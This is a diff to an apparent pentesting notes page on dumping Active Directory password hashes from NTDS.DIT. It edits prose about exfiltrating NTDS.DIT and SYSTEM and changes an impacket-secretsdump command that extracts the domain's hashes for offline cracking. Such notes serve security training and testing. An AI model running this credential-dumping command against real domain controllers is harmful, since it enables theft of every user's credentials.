@@ -14,12 +14,12 @@ The NTDS.DIT file is located typically at: `C:\Windows\NTDS\Ntds.dit`. Though Ad
 
 ## Extracting Password Hashes
 
-Once we have located NTDS.DIT, we can exfiltrate the file back to our host and crack if offline.&#x20;
+Once we have located NTDS.DIT & SYSTEM, we can exfiltrate the file back to our host and crack if offline.&#x20;
 
 ### Impacket-Secretsdump
 
 ```bash
-kali@kali$ impacket-secretsdump.py -ntds /ntds/data/ntds.dit -system /ntds/data/SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
+kali@kali$ impacket-secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
 ```
 
 ## The only thing left to do is:
